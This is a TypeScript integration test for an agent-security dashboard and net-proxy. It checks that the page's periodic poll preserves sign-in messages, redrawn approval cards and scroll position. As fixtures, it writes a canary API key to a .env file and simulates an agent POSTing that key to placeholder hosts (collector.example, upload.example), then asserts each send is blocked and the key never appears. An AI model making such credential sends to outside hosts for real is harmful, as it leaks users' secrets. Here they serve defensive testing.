/**
 * product-poll-keeps.test — the product page's 10 s poll keeps your place
 * (dashboard.md §4.25 *The poll keeps your place*, §4.25h), across the REAL
 * components. Mandu-new.
 *
 * Until 2026-10-09 every poll drew the cards of Approvals and the open agent
 * page again from nothing. Signed out, Block said "Sign in first: …" and the
 * next poll erased it, so the click looked dead; until later that day a poll
 * that brought a changed card (the agent tried the same send again) still
 * did, and on the agent page until that night. An agent page opened from an answer scrolled back to the marked step
 * every 10 s. This suite pins the
 * served page over a real arbiter, the net-proxy in production wiring and a
 * real DashboardServer, with no mocks:
 *
 *   P1  the net-proxy stops a registered key's send to a host no rule binds
 *       it to (`secrets` axes): a real question waits;
 *   P2  signed out, the served Approvals page: Block meets the real 403, the
 *       card says how to sign in, and a poll leaves the card, its words and
 *       its buttons as they are. Then the agent sends the same again (the
 *       arbiter counts it on the same question): the next poll draws the
 *       changed card again, "2 times", and it still says how to sign in
 *       (run 2130); the question is still waiting;
 *   P3  signed out, the served agent page: Block on its Waiting card meets
 *       the real 403 and says how to sign in. The agent sends the same
 *       again: the next poll draws the changed page again, "3 times", and
 *       the card still says how to sign in, its buttons working (run 2230);
 *   P4  signed in, the served agent page opened from the answer link
 *       (`?ask=`): a poll leaves the story as drawn and does not scroll; when
 *       the agent did more (a second stopped send), the poll draws the new
 *       step, keeps the mark and still does not scroll;
 *   P5  signed in, Block over the served page lands and the card leaves;
 *   P6  the oracle: neither `/api/home`, the agent page route nor any
 *       rendered page carries the key's value, and the product side carries
 *       no token.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { request as httpRequest } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { NetProxy } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import { DashboardServer, type ApprovalsArbiter } from "../../dashboard/src/server.js";
import { ArbiterEventSource } from "../../dashboard/src/event-source.js";
import { servedProductPage } from "../../dashboard/test/unit/ui/served-page.js";
import { waitWhile } from "../../dashboard/test/unit/page-wait.js";
import { stateAxes } from "../lib/axes.js";
import { humanSockIn } from "../lib/human-plane.js";
import { pageFetch } from "../../dashboard/test/unit/page-fetch.js";

stateAxes("secrets");

const KEY_VALUE = "sk_live_productPollKeepsStackCanary000001";
const SESSION = "1791300000-2030";
const CSRF = { "X-Mandu-Control": "1" };
const SIGN_IN = /^Sign in first: reload this page and sign in with your dashboard account/;

/** One absolute-form request through the forward proxy. */
function viaProxy(port: number, url: string, body: string): Promise<{ status: number; body: string }> {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
        res.on("error", reject);
      },
    );
    req.on("error", reject);
    req.end(body);
  });
}

/** The page's poll (what its 10 s timer and a return to the tab run), and a
 *  wait until the page has read `last` again, the read the poll makes after
 *  it drew everything else, and drawn what that read brought. */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
async function pollOnce(doc: any, last: RegExp): Promise<void> {
  const w = doc.defaultView;
  const inner = w.fetch;
  let drawn = false;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  w.fetch = (url: string, init: any) => inner(url, init).then((res: any) => (!last.test(String(url)) ? res
    : { ...res, json: () => res.json().then((v: unknown) => { setTimeout(() => { drawn = true; }, 0); return v; }) }));
  try {
    doc.dispatchEvent(new w.Event("visibilitychange"));
    await waitWhile(() => !drawn);
    assert.ok(drawn, `the poll read ${last} again`);
  } finally {
    w.fetch = inner;
  }
}

test("the product page's poll keeps your place: an answer's words on Approvals and the agent page, across a changed card too, and the agent page as you left it (real arbiter, net-proxy, dashboard)", { timeout: 180_000 }, async () => {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-poll-keeps-"));
  const home = join(tmp, "home");
  mkdirSync(join(home, "proj"), { recursive: true });
  const socketPath = join(tmp, "arbiter.sock");
  const humanPath = humanSockIn(tmp);
  const arbiter = new ArbiterServer({
    socketPath, adminSocketPath: join(tmp, "admin.sock"), humanSocketPath: humanPath,
    dbPath: join(tmp, "symbols.sqlite"), eventDir: join(tmp, "events"), log: () => {},
    confidentiality: true, integrity: false, // the `secrets` axes, stated
  });
  await arbiter.listen();

  // Production wiring of the net-proxy's arbiter (net-proxy/src/server-main.ts).
  const netClient = new ArbiterClient(socketPath);
  await netClient.connect();
  const netHuman = new ArbiterClient(humanPath);
  const forwarded: string[] = [];
  const proxy = new NetProxy({
    arbiter: new ArbiterClientAdapter(netClient as unknown as RealArbiterClient, netHuman),
    sessionId: SESSION,
    forwarder: async ({ url }) => {
      forwarded.push(url);
      throw new Error("a stopped send must never be forwarded");
    },
    log: () => {},
  });
  const proxyPort = await proxy.listen(0);

  const gate = new ArbiterClient(socketPath); await gate.connect();
  const admin = new ArbiterClient(join(tmp, "admin.sock")); await admin.connect();
  const approvalsArbiter: ApprovalsArbiter = {
    egressApprovals: (status) => admin.egressApprovals(status),
    resolveEgressApproval: (approvalId, approve, scope) => admin.resolveEgressApproval(approvalId, approve, scope),
  };
  const dashboard = new DashboardServer({
    source: new ArbiterEventSource({ socketPath, humanSocketPath: humanPath }),
    approvalsArbiter,
    fileBrowserHome: home,
    configEnv: { MANDU_HOME: join(tmp, "mandu-home") },
    log: () => {},
  });
  const base = `http://127.0.0.1:${await dashboard.listen(0)}`;
  const signedIn = { Cookie: dashboard.adminCookie() };
  const rendered: [string, string][] = [];
  try {
    // ── P1: a registered key bound for a host no rule names is stopped ───────
    const env = join(home, "proj", ".env");
    writeFileSync(env, `STRIPE_KEY=${KEY_VALUE}\n`);
    const reg = await gate.registerSecret({ path: env, sessionKey: SESSION });
    const keySym = /\$MDU:nomodel_Read\[[0-9a-f]+\]\.STRIPE_KEY/.exec(reg.twin ?? "")?.[0];
    assert.ok(keySym, `the key has its own symbol: ${JSON.stringify(reg)}`);
    const res = await viaProxy(proxyPort, "http://collector.example/upload", `k=${keySym}`);
    assert.equal(res.status, 403, `the send is stopped: ${res.body}`);
    assert.ok(!res.body.includes(KEY_VALUE), "the agent's answer carries no value");
    assert.deepEqual(forwarded, []);
    const row = (await admin.egressApprovals("pending")).find((a) => a.symbol === keySym);
    assert.ok(row, "the stop queued a question");
    // The stop's step is on the agent page once its event is stored
    // (emission is best-effort and asynchronous).
    const agentRoute = `${base}/api/home/agent?session=${SESSION}&ask=${encodeURIComponent(row!.id)}`;
    let located: string | null | undefined = null;
    for (let i = 0; i < 100 && !located; i++) {
      const vm = (await (await pageFetch(agentRoute, { headers: { ...CSRF, ...signedIn } })).json()) as { focus?: { turnId?: string | null } };
      located = vm.focus?.turnId;
      if (!located) await new Promise((r) => setTimeout(r, 20));
    }
    assert.ok(located, "the agent page finds the step where Mandu asked");

    // ── P2: signed out, Block's words outlast a poll ─────────────────────────
    const refused = await pageFetch(`${base}/api/egress/approvals/${row!.id}/deny`, { method: "POST", headers: CSRF });
    assert.equal(refused.status, 403, "signed out, the server refuses the answer");
    const cardSel = "#approvals-waiting .ask";
    await servedProductPage(base, "/approvals", (doc) => doc.querySelector(cardSel) !== null, async (doc) => {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const card = [...doc.querySelectorAll(cardSel)].find((c: any) => c.dataset.id === row!.id) as any;
      assert.ok(card, "the served page shows the question");
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const block = [...card.querySelectorAll("button")].find((b: any) => b.textContent === "Block") as any;
      block.click();
      await waitWhile(() => card.querySelector(".ask-error") === null);
      assert.match(card.querySelector(".ask-error")?.textContent ?? "", SIGN_IN, "the card says how to sign in");
      await pollOnce(doc, /\/api\/policy\/changes\?limit=21$/);
      assert.equal(doc.querySelector(cardSel), card, "the poll left the card as it is");
      assert.match(card.querySelector(".ask-error")?.textContent ?? "", SIGN_IN, "with its words");
      assert.equal(block.disabled, false, "and its buttons");
      // The agent tries the same send again: the same question, counted twice.
      const again = await viaProxy(proxyPort, "http://collector.example/upload", `k=${keySym}`);
      assert.equal(again.status, 403, "the repeat is stopped too");
      const counted = (await admin.egressApprovals("pending")).find((a) => a.id === row!.id);
      assert.equal(counted?.count, 2, "on the same question");
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const shown = () => [...doc.querySelectorAll(cardSel)].find((c: any) => c.dataset.id === row!.id) as any;
      for (let i = 0; i < 50 && shown() === card; i++) await pollOnce(doc, /\/api\/policy\/changes\?limit=21$/);
      const redrawn = shown();
      assert.ok(redrawn && redrawn !== card, "the poll drew the changed card again");
      assert.match(redrawn.textContent, /2 times/, "with its new count");
      assert.match(redrawn.querySelector(".ask-error")?.textContent ?? "", SIGN_IN, "and the words of your answer");
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      assert.equal(([...redrawn.querySelectorAll("button")].find((b: any) => b.textContent === "Block") as any).disabled, false, "its buttons work");
      rendered.push(["the signed-out Approvals page", doc.documentElement.outerHTML]);
    });
    assert.ok((await admin.egressApprovals("pending")).some((a) => a.id === row!.id), "the question still waits");

    // ── P3: signed out, the agent page's Waiting card keeps Block's words ────
    await servedProductPage(base, `/agents/${SESSION}`, (doc) => doc.querySelector("#agent-waiting .ask") !== null, async (doc) => {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const shown = () => [...doc.querySelectorAll("#agent-waiting .ask")].find((c: any) => c.dataset.id === row!.id) as any;
      const card = shown();
      assert.ok(card, "the agent page shows the question it waits on");
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      ([...card.querySelectorAll("button")].find((b: any) => b.textContent === "Block") as any).click();
      await waitWhile(() => card.querySelector(".ask-error") === null);
      assert.match(card.querySelector(".ask-error")?.textContent ?? "", SIGN_IN, "the card says how to sign in");
      // The agent tries the same send again: its page changes, and is drawn again.
      const again = await viaProxy(proxyPort, "http://collector.example/upload", `k=${keySym}`);
      assert.equal(again.status, 403, "the repeat is stopped too");
      assert.equal((await admin.egressApprovals("pending")).find((a) => a.id === row!.id)?.count, 3, "on the same question");
      const agentRead = new RegExp(`/api/home/agent\\?session=${SESSION}$`);
      for (let i = 0; i < 50 && shown() === card; i++) {
        await pollOnce(doc, agentRead);
        if (shown() === card) await new Promise((r) => setTimeout(r, 40));
      }
      const redrawn = shown();
      assert.ok(redrawn && redrawn !== card, "the poll drew the changed page again");
      assert.match(redrawn.textContent, /3 times/, "with the card's new count");
      assert.match(redrawn.querySelector(".ask-error")?.textContent ?? "", SIGN_IN, "and the words of your answer on the agent page");
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      assert.equal(([...redrawn.querySelectorAll("button")].find((b: any) => b.textContent === "Block") as any).disabled, false, "its buttons work");
      rendered.push(["the signed-out agent page", doc.documentElement.outerHTML]);
    });
    assert.ok((await admin.egressApprovals("pending")).some((a) => a.id === row!.id), "the question still waits");

    // ── P4: signed in, the agent page opened from the answer link ────────────
    await servedProductPage(base, `/agents/${SESSION}?ask=${encodeURIComponent(row!.id)}`,
      (doc) => doc.querySelector("#agent-story .focus-tag") !== null, async (doc) => {
        const w = doc.defaultView;
        // The visit's own scroll to the mark runs in the next frame: let it.
        await new Promise((r) => w.requestAnimationFrame(() => setTimeout(r, 0)));
        let scrolls = 0;
        w.HTMLElement.prototype.scrollIntoView = function () { scrolls++; };
        const tag = doc.querySelector("#agent-story .focus-tag");
        assert.equal(tag.textContent, "Mandu asked you here");
        const story = doc.getElementById("agent-story").firstElementChild;
        const agentRead = new RegExp(`/api/home/agent\\?session=${SESSION}&ask=`);
        await pollOnce(doc, agentRead);
        assert.equal(doc.getElementById("agent-story").firstElementChild, story, "the poll left the story as it is");
        assert.equal(doc.querySelector("#agent-story .focus-tag"), tag, "the mark with it");
        assert.equal(scrolls, 0, "and did not scroll");

        // The agent does more: a second send, stopped too.
        const second = await viaProxy(proxyPort, "http://upload.example/drop", `k=${keySym}`);
        assert.equal(second.status, 403);
        const steps = () => [...doc.querySelectorAll("#agent-story [data-step-id]")].length;
        const before = steps();
        let after = before;
        for (let i = 0; i < 50 && after === before; i++) {
          await pollOnce(doc, agentRead);
          after = steps();
          if (after === before) await new Promise((r) => setTimeout(r, 40));
        }
        assert.ok(after > before, `the poll drew the new step (${before} → ${after})`);
        assert.match(doc.getElementById("agent-story").textContent, /upload\.example/, "the second stopped send");
        assert.equal(doc.querySelector("#agent-story .focus-tag")?.textContent, "Mandu asked you here", "the step is still marked");
        assert.equal(scrolls, 0, "the redraw did not scroll you back to it");
        rendered.push(["the agent page", doc.documentElement.outerHTML]);
      }, { headers: signedIn });

    // ── P5: signed in, Block lands and the card leaves ───────────────────────
    await servedProductPage(base, "/approvals", (doc) => doc.querySelector(cardSel) !== null, async (doc) => {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const card = [...doc.querySelectorAll(cardSel)].find((c: any) => c.dataset.id === row!.id) as any;
      assert.ok(card);
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      ([...card.querySelectorAll("button")].find((b: any) => b.textContent === "Block") as any).click();
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      await waitWhile(() => [...doc.querySelectorAll(cardSel)].some((c: any) => c.dataset.id === row!.id));
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      assert.ok(![...doc.querySelectorAll(cardSel)].some((c: any) => c.dataset.id === row!.id), "the answered card left");
      assert.equal(doc.querySelector("#approvals-waiting .ask-error"), null, "with no refusal on the waiting cards");
      rendered.push(["the signed-in Approvals page", doc.documentElement.outerHTML]);
    }, { headers: signedIn });
    assert.ok(!(await admin.egressApprovals("pending")).some((a) => a.id === row!.id), "the answer landed");

    // ── P6: the oracle ───────────────────────────────────────────────────────
    const bodies: [string, string][] = [
      ["/api/home", await (await pageFetch(`${base}/api/home`)).text()],
      ["/api/home signed in", await (await pageFetch(`${base}/api/home`, { headers: { ...CSRF, ...signedIn } })).text()],
      ["/api/home/agent", await (await pageFetch(agentRoute, { headers: { ...CSRF, ...signedIn } })).text()],
      ...rendered,
    ];
    for (const [where, body] of bodies) {
      assert.ok(!body.includes(KEY_VALUE), `CONFIDENTIALITY VIOLATION: the key's value is in ${where}`);
      assert.doesNotMatch(body, /\$MDU/, `${where} carries no token`);
    }
  } finally {
    await dashboard.close();
    await proxy.close();
    netClient.close(); netHuman.close();
    gate.close(); admin.close();
    await arbiter.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
